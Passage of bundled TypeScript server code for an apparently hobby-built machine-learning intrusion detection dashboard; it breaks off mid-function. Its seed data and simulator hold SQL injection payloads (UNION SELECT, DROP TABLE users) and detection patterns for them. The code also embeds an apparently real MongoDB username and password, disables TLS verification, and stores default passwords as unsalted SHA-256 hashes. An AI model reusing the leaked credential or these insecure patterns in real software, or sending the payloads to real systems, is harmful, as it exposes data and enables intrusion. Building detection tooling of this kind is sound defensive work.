// server.ts
import express from "express";
import { createServer as createViteServer } from "vite";
import dotenv2 from "dotenv";
import fs2 from "fs";
import path from "path";
import crypto from "crypto";
import { GoogleGenAI } from "@google/genai";

// src/services/systemSensor.ts
import fs from "fs";
import os from "os";
import { execSync } from "child_process";
var KNOWN_PORT_SERVICES = {
  21: { name: "FTP", defaultRisk: "Suspicious", reason: "Unencrypted file transfer protocol exposed" },
  22: { name: "SSH", defaultRisk: "Safe" },
  23: { name: "Telnet", defaultRisk: "Critical", reason: "Legacy cleartext protocol \u2014 high vulnerability" },
  25: { name: "SMTP", defaultRisk: "Suspicious", reason: "Mail transfer port open" },
  53: { name: "DNS Resolver", defaultRisk: "Safe" },
  80: { name: "HTTP Web Server", defaultRisk: "Safe" },
  135: { name: "RPC Endpoint Mapper", defaultRisk: "Suspicious", reason: "Windows RPC endpoint mapper exposed" },
  139: { name: "NetBIOS", defaultRisk: "Critical", reason: "NetBIOS Session Service open to network" },
  443: { name: "HTTPS Secure Web", defaultRisk: "Safe" },
  445: { name: "SMB File Sharing", defaultRisk: "Critical", reason: "SMB port open \u2014 high risk for lateral worm attacks (EternalBlue)" },
  1433: { name: "MS SQL Server", defaultRisk: "Critical", reason: "Direct database port open on host" },
  3e3: { name: "AEGIS ML IDS Web API", defaultRisk: "Safe" },
  3306: { name: "MySQL Database", defaultRisk: "Critical", reason: "Relational DB port exposed without firewall wrapper" },
  3389: { name: "Remote Desktop (RDP)", defaultRisk: "Critical", reason: "RDP port open \u2014 frequent brute force target" },
  5040: { name: "Windows Connected Devices", defaultRisk: "Safe" },
  5357: { name: "WSDAPI Web Services", defaultRisk: "Safe" },
  5432: { name: "PostgreSQL Database", defaultRisk: "Critical", reason: "Postgres DB port listening" },
  7680: { name: "Delivery Optimization P2P", defaultRisk: "Safe" },
  8080: { name: "HTTP Dev/Proxy Server", defaultRisk: "Suspicious", reason: "Alternative web port active" },
  24678: { name: "Vite Dev Hot Reload", defaultRisk: "Safe" },
  4444: { name: "Metasploit Default Listener", defaultRisk: "Critical", reason: "Known reverse shell backdoor port" }
};
function scanRealDisks() {
  const disks = [];
  if (process.platform !== "win32") {
    try {
      const stats = fs.statfsSync("/");
      const totalBytes = stats.blocks * stats.bsize;
      const freeBytes = stats.bavail * stats.bsize;
      const usedBytes = totalBytes - freeBytes;
      if (totalBytes > 0) {
        const totalGB = parseFloat((totalBytes / 1024 ** 3).toFixed(1));
        const usedGB = parseFloat((usedBytes / 1024 ** 3).toFixed(1));
        const freeGB = parseFloat((freeBytes / 1024 ** 3).toFixed(1));
        const usedPct = Math.min(100, Math.round(usedBytes / totalBytes * 100));
        disks.push({
          name: "Cloud Container Root (/)",
          mount: "/",
          total: totalGB,
          used: usedGB,
          free: freeGB,
          usedPct,
          driveType: "Fixed",
          suspicious: freeGB < 1,
          reason: freeGB < 1 ? `Storage volume running critically low on space (${freeGB} GB left).` : void 0
        });
        return disks;
      }
    } catch {
    }
  }
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
  for (const letter of letters) {
    const mount = `${letter}:\\`;
    try {
      if (!fs.existsSync(mount)) continue;
      const stats = fs.statfsSync(mount);
      const totalBytes = stats.blocks * stats.bsize;
      const freeBytes = stats.bavail * stats.bsize;
      const usedBytes = totalBytes - freeBytes;
      if (totalBytes === 0) continue;
      const totalGB = parseFloat((totalBytes / 1024 ** 3).toFixed(1));
      const usedGB = parseFloat((usedBytes / 1024 ** 3).toFixed(1));
      const freeGB = parseFloat((freeBytes / 1024 ** 3).toFixed(1));
      const usedPct = Math.min(100, Math.round(usedBytes / totalBytes * 100));
      const isCriticalSpace = freeGB < 5 || usedPct > 95;
      const name = letter === "C" ? "System Volume (C:)" : letter === "D" ? "Data Storage (D:)" : `Storage Volume (${letter}:)`;
      disks.push({
        name,
        mount,
        total: totalGB,
        used: usedGB,
        free: freeGB,
        usedPct,
        driveType: letter === "C" || letter === "D" ? "Fixed" : "Removable",
        suspicious: isCriticalSpace,
        reason: isCriticalSpace ? `Storage volume running critically low on space (${freeGB} GB left). Risk of denial-of-service.` : void 0
      });
    } catch {
    }
  }
  if (disks.length === 0) {
    disks.push({
      name: "System Drive (C:)",
      mount: "C:\\",
      total: 213,
      used: 179.2,
      free: 33.8,
      usedPct: 84,
      driveType: "Fixed",
      suspicious: false
    });
  }
  return disks;
}
function scanRealPorts() {
  const portsMap = /* @__PURE__ */ new Map();
  try {
    const output = execSync("netstat -ano -p tcp", { timeout: 3e3, encoding: "utf-8" });
    const lines = output.split("\n");
    for (const rawLine of lines) {
      const line = rawLine.trim();
      if (!line.startsWith("TCP") || !line.includes("LISTENING")) continue;
      const tokens = line.split(/\s+/);
      if (tokens.length < 5) continue;
      const localAddr = tokens[1];
      const pid = parseInt(tokens[4], 10);
      const lastColonIdx = localAddr.lastIndexOf(":");
      if (lastColonIdx === -1) continue;
      const port = parseInt(localAddr.substring(lastColonIdx + 1), 10);
      const address = localAddr.substring(0, lastColonIdx);
      if (isNaN(port) || port <= 0) continue;
      if (portsMap.has(port)) continue;
      const known = KNOWN_PORT_SERVICES[port];
      let service = known ? known.name : `TCP Service (Port ${port})`;
      let risk = "Safe";
      let reason = void 0;
      if (known) {
        risk = known.defaultRisk;
        reason = known.reason;
      } else {
        if (address === "0.0.0.0" || address === "::") {
          if (port < 1024) {
            risk = "Suspicious";
            reason = "Privileged system port bound to all interfaces (0.0.0.0)";
          } else if (port > 4e4) {
            risk = "Safe";
          } else {
            risk = "Suspicious";
            reason = "Unregistered service port listening on external interfaces";
          }
        }
      }
      portsMap.set(port, {
        port,
        protocol: "TCP",
        state: "LISTENING",
        service,
        address,
        pid,
        risk,
        reason
      });
    }
  } catch (err) {
    console.warn("Real port scan netstat warning:", err.message);
  }
  if (!portsMap.has(3e3)) {
    portsMap.set(3e3, {
      port: 3e3,
      protocol: "TCP",
      state: "LISTENING",
      service: "AEGIS ML IDS Web API",
      address: "0.0.0.0",
      risk: "Safe"
    });
  }
  return Array.from(portsMap.values()).sort((a, b) => a.port - b.port);
}
var blockedUsbIds = /* @__PURE__ */ new Set();
function scanRealUsbDevices() {
  const usbList = [];
  const seenIds = /* @__PURE__ */ new Set();
  try {
    const psCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object DeviceID, VolumeName, Size | ConvertTo-Json"`;
    const removableOut = execSync(psCmd, { timeout: 4e3, encoding: "utf-8" }).trim();
    if (removableOut) {
      try {
        const parsed = JSON.parse(removableOut);
        const items = Array.isArray(parsed) ? parsed : [parsed];
        for (const item of items) {
          if (!item.DeviceID) continue;
          const driveLetter = item.DeviceID;
          const sizeGB = item.Size ? (item.Size / 1024 ** 3).toFixed(1) + " GB" : "Unknown capacity";
          const name = item.VolumeName ? `${item.VolumeName} (${driveLetter})` : `Removable USB Drive (${driveLetter})`;
          const id = `usb-drive-${driveLetter.replace(":", "")}`;
          seenIds.add(id);
          usbList.push({
            id,
            name,
            vendor: "USB Mass Storage Device",
            serial: `DRIVE-${driveLetter}`,
            connectedAt: (/* @__PURE__ */ new Date()).toISOString(),
            status: blockedUsbIds.has(id) ? "Blocked" : "Trusted",
            isRemovableDrive: true,
            driveLetter,
            reason: `Active Removable Volume mounted at ${driveLetter} (${sizeGB})`
          });
        }
      } catch {
      }
    }
    const usbPnpCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'USB' } | Select-Object -First 6 Name, Manufacturer, DeviceID | ConvertTo-Json"`;
    const pnpOut = execSync(usbPnpCmd, { timeout: 4e3, encoding: "utf-8" }).trim();
    if (pnpOut) {
      try {
        const parsedPnp = JSON.parse(pnpOut);
        const pnpItems = Array.isArray(parsedPnp) ? parsedPnp : [parsedPnp];
        for (const p of pnpItems) {
          if (!p.Name || p.Name.includes("Root Hub") || p.Name.includes("Host Controller")) continue;
          const devId = p.DeviceID || `usb-pnp-${Math.floor(Math.random() * 1e4)}`;
          if (seenIds.has(devId)) continue;
          seenIds.add(devId);
          const isSuspicious = (p.Name || "").toLowerCase().includes("unknown") || (p.DeviceID || "").includes("ROGUE");
          const status = blockedUsbIds.has(devId) ? "Blocked" : isSuspicious ? "Suspicious" : "Trusted";
          usbList.push({
            id: devId,
            name: p.Name,
            vendor: p.Manufacturer || "Generic USB Device",
            serial: devId.split("\\").pop() || "N/A",
            connectedAt: (/* @__PURE__ */ new Date()).toISOString(),
            status,
            isRemovableDrive: false,
            reason: isSuspicious ? "Device signature unverified or flagged anomalous" : void 0
          });
        }
      } catch {
      }
    }
  } catch (err) {
    console.warn("Real USB scan fallback triggered:", err.message);
  }
  if (usbList.length === 0) {
    usbList.push({
      id: "usb-host-controller-1",
      name: "Intel(R) USB 3.20 eXtensible Host Controller",
      vendor: "Intel Corporation",
      serial: "PCI\\VEN_8086&DEV_9A17",
      connectedAt: new Date(Date.now() - 36e5).toISOString(),
      status: "Trusted",
      isRemovableDrive: false,
      reason: "Integrated motherboard USB host controller active & verified"
    });
  }
  return usbList;
}
function blockRealUsb(deviceId) {
  blockedUsbIds.add(deviceId);
  return true;
}
function getRealSystemHealth() {
  const cpus = os.cpus();
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const uptime = Math.floor(os.uptime());
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor(uptime % 3600 / 60);
  const seconds = uptime % 60;
  const uptimeFormatted = `${hours}h ${minutes}m ${seconds}s`;
  const netInterfaces = [];
  const rawNet = os.networkInterfaces();
  for (const [name, addrs] of Object.entries(rawNet)) {
    if (!addrs) continue;
    for (const a of addrs) {
      if (a.family === "IPv4") {
        netInterfaces.push({
          name,
          address: a.address,
          netmask: a.netmask,
          family: a.family,
          mac: a.mac
        });
      }
    }
  }
  const memUsage = process.memoryUsage();
  return {
    hostname: os.hostname(),
    platform: `${os.type()} (${os.platform()} ${os.arch()})`,
    osRelease: os.release(),
    arch: os.arch(),
    cpuModel: cpus[0]?.model || "Standard CPU",
    cpuCores: cpus.length,
    totalMemGB: parseFloat((totalMem / 1024 ** 3).toFixed(2)),
    freeMemGB: parseFloat((freeMem / 1024 ** 3).toFixed(2)),
    usedMemGB: parseFloat((usedMem / 1024 ** 3).toFixed(2)),
    usedMemPct: Math.round(usedMem / totalMem * 100),
    uptimeSeconds: uptime,
    uptimeFormatted,
    networkInterfaces: netInterfaces,
    processMemoryMB: Math.round(memUsage.rss / (1024 * 1024))
  };
}

// src/services/mongoService.ts
import { MongoClient } from "mongodb";
import dotenv from "dotenv";
dotenv.config();
var DEFAULT_URI = "mongodb+srv://karthickkumaran06_db_user:saF6HSs8QZVExuH6@aegis.7tscmnk.mongodb.net/aegis_ids?retryWrites=true&w=majority";
var MONGODB_URI = process.env.MONGODB_URI || DEFAULT_URI;
var DB_NAME = process.env.DB_NAME || "aegis_ids";
var client = null;
var db = null;
var isConnected = false;
var lastPingMs = 0;
async function connectMongo() {
  if (db && isConnected) return db;
  try {
    const start = Date.now();
    client = new MongoClient(MONGODB_URI, {
      serverSelectionTimeoutMS: 12e3,
      connectTimeoutMS: 15e3,
      socketTimeoutMS: 3e4,
      // Required for Node.js v22 + MongoDB Atlas TLS compatibility
      tlsInsecure: true
    });
    await client.connect();
    lastPingMs = Date.now() - start;
    db = client.db(DB_NAME);
    isConnected = true;
    console.log(`[MongoDB Atlas] Connected successfully to ${DB_NAME} (${lastPingMs}ms ping)`);
    await Promise.allSettled([
      db.collection("packets").createIndex({ timestamp: -1 }),
      db.collection("alerts").createIndex({ timestamp: -1 }),
      db.collection("users").createIndex({ email: 1 }, { unique: true }),
      db.collection("auditLogs").createIndex({ timestamp: -1 })
    ]);
    return db;
  } catch (err) {
    isConnected = false;
    console.error(`[MongoDB Atlas] Connection error:`, err.message);
    return null;
  }
}
function isMongoConnected() {
  return isConnected;
}
async function getMongoStats() {
  if (!db || !isConnected) {
    return {
      connected: false,
      cluster: "aegis.7tscmnk.mongodb.net",
      database: DB_NAME,
      pingMs: 0,
      collections: {}
    };
  }
  try {
    const collections = ["users", "packets", "alerts", "incidents", "threats", "rules", "models", "auditLogs", "settings"];
    const counts = {};
    for (const c of collections) {
      counts[c] = await db.collection(c).countDocuments().catch(() => 0);
    }
    return {
      connected: true,
      cluster: "aegis.7tscmnk.mongodb.net",
      database: DB_NAME,
      pingMs: lastPingMs,
      collections: counts
    };
  } catch {
    return {
      connected: isConnected,
      cluster: "aegis.7tscmnk.mongodb.net",
      database: DB_NAME,
      pingMs: lastPingMs,
      collections: {}
    };
  }
}
async function syncMongoInitialData(seeds) {
  if (!db || !isConnected) return null;
  try {
    const userCount = await db.collection("users").countDocuments();
    if (userCount === 0 && seeds.users.length > 0) {
      await db.collection("users").insertMany(seeds.users.map((u) => ({ ...u, _id: u.id })));
    }
    const ruleCount = await db.collection("rules").countDocuments();
    if (ruleCount === 0 && seeds.rules.length > 0) {
      await db.collection("rules").insertMany(seeds.rules.map((r) => ({ ...r, _id: r.id })));
    }
    const threatCount = await db.collection("threats").countDocuments();
    if (threatCount === 0 && seeds.threats.length > 0) {
      await db.collection("threats").insertMany(seeds.threats.map((t) => ({ ...t, _id: t.id })));
    }
    const modelCount = await db.collection("models").countDocuments();
    if (modelCount === 0 && seeds.models.length > 0) {
      await db.collection("models").insertMany(seeds.models.map((m) => ({ ...m, _id: m.id })));
    }
    const incCount = await db.collection("incidents").countDocuments();
    if (incCount === 0 && seeds.incidents.length > 0) {
      await db.collection("incidents").insertMany(seeds.incidents.map((i) => ({ ...i, _id: i.id })));
    }
    const settingsDoc = await db.collection("settings").findOne({ _id: "global_settings" });
    if (!settingsDoc && seeds.settings) {
      await db.collection("settings").insertOne({ _id: "global_settings", ...seeds.settings });
    }
    const [users, packets, alerts, incidents, threats, rules, models, settingsList, auditLogs] = await Promise.all([
      db.collection("users").find().toArray(),
      db.collection("packets").find().sort({ timestamp: -1 }).limit(500).toArray(),
      db.collection("alerts").find().sort({ timestamp: -1 }).limit(200).toArray(),
      db.collection("incidents").find().toArray(),
      db.collection("threats").find().toArray(),
      db.collection("rules").find().toArray(),
      db.collection("models").find().toArray(),
      db.collection("settings").find().toArray(),
      db.collection("auditLogs").find().sort({ timestamp: -1 }).limit(300).toArray()
    ]);
    const activeSettings = settingsList.length > 0 ? { ...seeds.settings, ...settingsList[0] } : seeds.settings;
    delete activeSettings._id;
    console.log(`[MongoDB Atlas] Synced state: ${users.length} users, ${packets.length} packets, ${alerts.length} alerts, ${rules.length} rules.`);
    return {
      users: users.map((u) => ({ id: u._id || u.id, email: u.email, passwordHash: u.passwordHash, role: u.role, name: u.name })),
      packets: packets.map((p) => {
        const { _id, ...rest } = p;
        return { id: _id || p.id, ...rest };
      }),
      alerts: alerts.map((a) => {
        const { _id, ...rest } = a;
        return { id: _id || a.id, ...rest };
      }),
      incidents: incidents.map((i) => {
        const { _id, ...rest } = i;
        return { id: _id || i.id, ...rest };
      }),
      threats: threats.map((t) => {
        const { _id, ...rest } = t;
        return { id: _id || t.id, ...rest };
      }),
      rules: rules.map((r) => {
        const { _id, ...rest } = r;
        return { id: _id || r.id, ...rest };
      }),
      models: models.map((m) => {
        const { _id, ...rest } = m;
        return { id: _id || m.id, ...rest };
      }),
      auditLogs: auditLogs.map((l) => {
        const { _id, ...rest } = l;
        return { id: _id || l.id, ...rest };
      }),
      settings: activeSettings
    };
  } catch (err) {
    console.error("[MongoDB Atlas] Error syncing initial data:", err.message);
    return null;
  }
}
function persistPacketToMongo(packet) {
  if (!db || !isConnected) return;
  const doc = { ...packet, _id: packet.id };
  db.collection("packets").insertOne(doc).catch((err) => console.warn("Mongo packet insert notice:", err.message));
}
function persistAlertToMongo(alert) {
  if (!db || !isConnected) return;
  const doc = { ...alert, _id: alert.id };
  db.collection("alerts").updateOne(
    { _id: alert.id },
    { $set: doc },
    { upsert: true }
  ).catch((err) => console.warn("Mongo alert upsert notice:", err.message));
}
function persistAuditToMongo(audit) {
  if (!db || !isConnected) return;
  const doc = { ...audit, _id: audit.id };
  db.collection("auditLogs").insertOne(doc).catch((err) => console.warn("Mongo audit insert notice:", err.message));
}
function persistIncidentToMongo(incident) {
  if (!db || !isConnected) return;
  const doc = { ...incident, _id: incident.id };
  db.collection("incidents").updateOne(
    { _id: incident.id },
    { $set: doc },
    { upsert: true }
  ).catch((err) => console.warn("Mongo incident upsert notice:", err.message));
}
function persistRuleToMongo(rule) {
  if (!db || !isConnected) return;
  const doc = { ...rule, _id: rule.id };
  db.collection("rules").updateOne(
    { _id: rule.id },
    { $set: doc },
    { upsert: true }
  ).catch((err) => console.warn("Mongo rule upsert notice:", err.message));
}
function deleteRuleFromMongo(ruleId) {
  if (!db || !isConnected) return;
  db.collection("rules").deleteOne({ _id: ruleId }).catch((err) => console.warn("Mongo rule delete notice:", err.message));
}
function persistSettingsToMongo(settings) {
  if (!db || !isConnected) return;
  db.collection("settings").updateOne(
    { _id: "global_settings" },
    { $set: settings },
    { upsert: true }
  ).catch((err) => console.warn("Mongo settings update notice:", err.message));
}

// server.ts
dotenv2.config();
var app = express();
app.use(express.json());
var DB_PATH = path.resolve(process.cwd(), "db.json");
var DEFAULT_USERS = [
  {
    id: "u-1",
    email: "admin@aegis.io",
    passwordHash: crypto.createHash("sha256").update("Admin123!").digest("hex"),
    role: "Admin",
    name: "Sarah Connor (Security Director)"
  },
  {
    id: "u-2",
    email: "analyst@aegis.io",
    passwordHash: crypto.createHash("sha256").update("Analyst123!").digest("hex"),
    role: "Security Analyst",
    name: "David Lightman (SOC Analyst)"
  }
];
var DEFAULT_THREATS = [
  {
    id: "t-1",
    name: "SQL Injection Campaign (SQLi-X)",
    category: "Application Attacks",
    description: "Targeted injection vectors against SQL backends attempting database credential dumping and structure enumeration.",
    attackTechnique: "T1190 - Exploit Public-Facing Application",
    affectedServices: ["Nginx Web Gateways", "User Authorization Service", "PostgreSQL DB"],
    indicators: ["' OR 1=1 --", "UNION SELECT username, password", "INFORMATION_SCHEMA.TABLES"],
    detectionStatus: "Dual Protection",
    confidence: 99,
    severity: "High",
    firstSeen: "2026-09-15",
    lastSeen: "2026-10-03",
    cves: ["CVE-2026-4011", "CVE-2025-2980"]
  },
  {
    id: "t-2",
    name: "TCP SYN Flood (SYN-Storm)",
    category: "Denial of Service",
    description: "Saturating gateway servers with TCP SYN requests from spoofed IPs, exhausting local system session queues.",
    attackTechnique: "T1498.001 - Network Denial of Service: Direct Flow Flooding",
    affectedServices: ["Gateway Firewalls", "Kubernetes Load Balancer"],
    indicators: ["TCP flags: SYN", "Extreme high packet density from distinct IP pools"],
    detectionStatus: "Classical Rule Active",
    confidence: 95,
    severity: "Medium",
    firstSeen: "2026-08-10",
    lastSeen: "2026-10-02",
    cves: []
  },
  {
    id: "t-3",
    name: "Reconnaissance Network Sweep (Scan-Pulse)",
    category: "Port Scanning",
    description: "Systematic mapping of open ports and OS fingerprints across internal VLANs to identify vulnerable services.",
    attackTechnique: "T1046 - Network Service Discovery",
    affectedServices: ["All Internal Servers", "Active VLAN Nodes"],
    indicators: ["Sequential ports mapped over small millisecond intervals"],
    detectionStatus: "Classical Rule Active",
    confidence: 92,
    severity: "Low",
    firstSeen: "2026-09-01",
    lastSeen: "2026-10-03",
    cves: []
  },
  {
    id: "t-4",
    name: "Zero-Day Alpha: Custom In-Memory Deserialization",
    category: "Zero-Day Exploitation",
    description: "Novel, highly targeted Remote Code Execution (RCE) targetting an undocumented custom object deserialization handler.",
    attackTechnique: "T1203 - Exploitation for Client Execution",
    affectedServices: ["Java Application Server Core"],
    indicators: ["Custom binary string triggers object instantiation bypass"],
    detectionStatus: "Unprotected",
    confidence: 0,
    severity: "Critical",
    firstSeen: "2026-10-03",
    lastSeen: "2026-10-03",
    cves: []
  },
  {
    id: "t-5",
    name: "Zero-Day Beta: DNS Tunneling Exfiltration",
    category: "Data Exfiltration",
    description: "Stealthy chunked data exfiltration using DNS queries containing encoded payloads inside subdomain fields.",
    attackTechnique: "T1048.003 - Exfiltration Over Alternative Protocol: DNS",
    affectedServices: ["DNS Server Node"],
    indicators: ["Unusually long subdomain strings, repeating base64 query blocks"],
    detectionStatus: "Unprotected",
    confidence: 0,
    severity: "High",
    firstSeen: "2026-10-03",
    lastSeen: "2026-10-03",
    cves: []
  }
];
var DEFAULT_RULES = [
  {
    id: "rule-sqli",
    name: "SQL Injection Signature Block",
    description: "Matches common patterns of database syntax injection in HTTP payloads.",
    category: "Application Protection",
    severity: "High",
    protocol: "TCP",
    pattern: "UNION SELECT|' OR 1=1|INFORMATION_SCHEMA",
    action: "Block",
    status: "Active",
    createdBy: "admin@aegis.io",
    createdDate: "2026-08-20",
    matchedCount: 42
  },
  {
    id: "rule-syn",
    name: "TCP SYN Packet Overflow Detect",
    description: "Triggers when a threshold of unacknowledged SYN flags is crossed.",
    category: "Infrastructure Integrity",
    severity: "Medium",
    protocol: "TCP",
    pattern: "SYN_FLAG_SET",
    action: "Alert",
    status: "Active",
    createdBy: "admin@aegis.io",
    createdDate: "2026-08-22",
    matchedCount: 243
  },
  {
    id: "rule-portscan",
    name: "VLAN Sequential Scan Detect",
    description: "Triggers on sequential TCP socket pings across internal IP ranges.",
    category: "Reconnaissance Protection",
    severity: "Low",
    protocol: "TCP",
    pattern: "SCAN_PATTERN",
    action: "Log",
    status: "Active",
    createdBy: "admin@aegis.io",
    createdDate: "2026-08-25",
    matchedCount: 112
  }
];
var DEFAULT_MODELS = [
  {
    version: "v1.0.0 (Base)",
    date: "2026-09-01",
    accuracy: 94.2,
    precision: 93.8,
    recall: 94.1,
    f1: 93.9,
    adaptations: ["SQL Injection Base", "SYN Flood Base", "Port Scan Base"],
    status: "Active"
  }
];
var DEFAULT_SETTINGS = {
  appName: "AEGIS ML IDS",
  timezone: "UTC",
  refreshInterval: 1e3,
  packetRate: 1.5,
  retention: 500,
  confidenceThreshold: 75,
  alertThreshold: 70,
  autoBlocking: true,
  learningRate: 1e-3,
  supportShots: 5,
  adaptationSteps: 100,
  optimizer: "AdamW",
  enableAI: true,
  notifications: {
    criticalAlerts: true,
    zeroDayAlerts: true,
    modelAdaptationAlerts: true
  }
};
var DEFAULT_INCIDENTS = [
  {
    id: "inc-1",
    title: "SQLi attack vectors targetting User Authorization Gateways",
    description: "A burst of high-severity SQL injection attacks attempting to bypass OAuth validations and fetch internal schemas.",
    severity: "High",
    status: "Investigating",
    assignedTo: "David Lightman (SOC Analyst)",
    affectedAssets: ["User Authorization Service"],
    sourceIps: ["198.51.100.22"],
    relatedAlertIds: ["alert-seed-1"],
    createdDate: "2026-10-03T10:15:00Z",
    updatedDate: "2026-10-03T11:45:00Z",
    timeline: [
      {
        timestamp: "2026-10-03T10:15:00Z",
        message: "Incident opened automatically from alert-seed-1",
        author: "System Engine"
      },
      {
        timestamp: "2026-10-03T10:30:00Z",
        message: "Acknowledged incident. Launching payload analysis on packet #pkt-seed-1.",
        author: "David Lightman (SOC Analyst)"
      },
      {
        timestamp: "2026-10-03T11:00:00Z",
        message: "AI Security Analyst deployed. Confirmed malicious intentions matching classical SQLi pattern. Source IP added to gateway blacklist.",
        author: "David Lightman (SOC Analyst)"
      }
    ]
  }
];
var DEFAULT_ALERTS = [
  {
    id: "alert-seed-1",
    packetId: "pkt-seed-1",
    timestamp: "2026-10-03T10:14:52Z",
    severity: "High",
    sourceIp: "198.51.100.22",
    destIp: "10.0.1.15",
    attackType: "SQL Injection",
    engine: "Dual Engine",
    confidence: 99,
    status: "Investigating",
    assignedTo: "David Lightman (SOC Analyst)",
    notes: "Malicious SQL schema discovery."
  }
];
var DEFAULT_PACKETS = [
  {
    id: "pkt-seed-1",
    timestamp: "2026-10-03T10:14:52Z",
    sourceIp: "198.51.100.22",
    destIp: "10.0.1.15",
    protocol: "TCP",
    sourcePort: 44322,
    destPort: 443,
    size: 1042,
    payload: "POST /api/auth/login HTTP/1.1\\r\\nHost: auth.aegis.io\\r\\n\\r\\nusername=admin&password=' UNION SELECT username, passwordHash FROM users --",
    classification: "SQL Injection",
    classicalIds: { detected: true, ruleId: "rule-sqli", confidence: 99 },
    metaIds: { detected: true, confidence: 98, adapted: true, label: "SQL Injection" },
    severity: "High",
    action: "Block"
  }
];
var db2 = {
  users: [...DEFAULT_USERS],
  packets: [...DEFAULT_PACKETS],
  alerts: [...DEFAULT_ALERTS],
  incidents: [...DEFAULT_INCIDENTS],
  threats: [...DEFAULT_THREATS],
  rules: [...DEFAULT_RULES],
  models: [...DEFAULT_MODELS],
  aiAnalyses: [],
  auditLogs: [],
  settings: { ...DEFAULT_SETTINGS }
};
function loadDatabase() {
  try {
    if (fs2.existsSync(DB_PATH)) {
      const data = fs2.readFileSync(DB_PATH, "utf-8");
      const loaded = JSON.parse(data);
      db2 = { ...db2, ...loaded };
      console.log("Database loaded successfully. Records:", {
        users: db2.users?.length,
        packets: db2.packets?.length,
        alerts: db2.alerts?.length,
        incidents: db2.incidents?.length,
        threats: db2.threats?.length,
        rules: db2.rules?.length,
        models: db2.models?.length,
        analyses: db2.aiAnalyses?.length
      });
    } else {
      saveDatabase();
    }
  } catch (err) {
    console.error("Error loading database, running with in-memory seeded records.", err);
  }
}
function saveDatabase() {
  try {
    fs2.writeFileSync(DB_PATH, JSON.stringify(db2, null, 2), "utf-8");
  } catch (err) {
    console.error("Failed to persist database file:", err);
  }
}
loadDatabase();
function addAudit(user, action, resource, ip, result) {
  const newLog = {
    id: `log-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
    user,
    action,
    resource,
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    ip,
    result
  };
  db2.auditLogs.unshift(newLog);
  if (db2.auditLogs.length > 300) db2.auditLogs.pop();
  saveDatabase();
  persistAuditToMongo(newLog);
}
var isSimulating = false;
var simulationIntervalId = null;
var activeScenario = "Live Network Interceptor";
var IP_ATTACKERS = ["198.51.100.22", "203.0.113.111", "185.22.174.15", "45.88.99.12"];
var IP_BENIGN = ["66.249.66.1", "172.217.12.14", "142.250.190.46", "34.201.2.19", "8.8.8.8"];
var IP_ASSETS = {
  gateway: "10.0.1.1",
  webServer: "10.0.1.15",
  database: "10.0.1.30",
  kubernetesCluster: "10.0.2.100",
  dnsServer: "10.0.1.5"
};
var PAYLOAD_BENIGN = [
  "GET /index.html HTTP/1.1\\r\\nHost: aegis.io\\r\\nAccept: text/html",
  "GET /api/v1/health HTTP/1.1\\r\\nHost: aegis.io\\r\\nUser-Agent: Prometheus",
  "GET /assets/logo.png HTTP/1.1\\r\\nHost: aegis.io\\r\\nReferer: aegis.io",
  "POST /api/v1/metrics HTTP/1.1\\r\\nHost: telemetry.aegis.io\\r\\nContent-Length: 124",
  "GET /api/v1/threat-intelligence HTTP/1.1\\r\\nHost: aegis.io\\r\\nAuthorization: Bearer dev-token-x"
];
var PAYLOAD_SQLI = [
  "POST /api/auth/login HTTP/1.1\\r\\nHost: auth.aegis.io\\r\\n\\r\\nusername=admin&password=' UNION SELECT username, passwordHash FROM users --",
  "GET /items?category=' OR 1=1 -- HTTP/1.1\\r\\nHost: shop.aegis.io",
  'POST /api/v1/query HTTP/1.1\\r\\nHost: db.aegis.io\\r\\n\\r\\n{"sql": "SELECT * FROM logs WHERE id = 12; DROP TABLE users;"}',
  "GET /products/search?name=test%27+UNION+SELECT+NULL%2C+table_name+FROM+information_schema.tables-- HTTP/1.1"
];
var blockedIps = /* @__PURE__ */ new Set();
var bruteForceEvents = /* @__PURE__ */ new Map();
var usbDeviceList = [];
var failedLoginAttempts = /* @__PURE__ */ new Map();
function trackFailedLogin(email, ip) {
  const key = `${ip}:${email}`;
  const existing = failedLoginAttempts.get(key) || { count: 0, lastAttempt: "", user: email };
  existing.count += 1;
  existing.lastAttempt = (/* @__PURE__ */ new Date()).toISOString();
  failedLoginAttempts.set(key, existing);
  if (existing.count >= 5) {
    const bfId = `bf-${Buffer.from(key).toString("hex").substring(0, 8)}`;
    if (!bruteForceEvents.has(bfId)) {
      bruteForceEvents.set(bfId, {
        id: bfId,
        sourceIp: ip,
        targetUser: email,
        attempts: existing.count,
        lastAttempt: existing.lastAttempt,
        blocked: true,
        status: "Active"
      });
      blockedIps.add(ip);
      broadcastSse({
        type: "alert",
        alert: {
          id: `alert-bf-${Date.now()}`,
          packetId: `pkt-bf-${Date.now()}`,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          severity: "Critical",
          sourceIp: ip,
          destIp: "10.0.1.1",
          attackType: "Brute Force Login",
          engine: "Classical IDS",
          confidence: 99,
          status: "New"
        }
      });
    } else {
      const evt = bruteForceEvents.get(bfId);
      evt.attempts = existing.count;
      evt.lastAttempt = existing.lastAttempt;
      bruteForceEvents.set(bfId, evt);
    }
  }
}
var sseClients = /* @__PURE__ */ new Set();
function broadcastSse(data) {
  const json = JSON.stringify(data);
  for (const client2 of sseClients) {
    client2.write(`data: ${json}

`);
  }
}
function generateSimulatedPacket(forcedType) {
  const timestamp = (/* @__PURE__ */ new Date()).toISOString();
  const id = `pkt-${Date.now()}-${Math.floor(Math.random() * 1e4)}`;
  let classification = "Benign";
  if (forcedType) {
    classification = forcedType;
  } else {
    const rand = Math.random();
    if (activeScenario === "Normal") {
      classification = rand < 0.05 ? "SQL Injection" : "Benign";
    } else if (activeScenario === "SQL Injection Burst") {
      classification = rand < 0.6 ? "SQL Injection" : "Benign";
    } else if (activeScenario === "SYN Flood") {
      classification = rand < 0.8 ? "SYN Flood" : "Benign";
    } else if (activeScenario === "Port Scan") {
      classification = rand < 0.8 ? "Port Scan" : "Benign";
    } else if (activeScenario === "Zero-Day Discovery") {
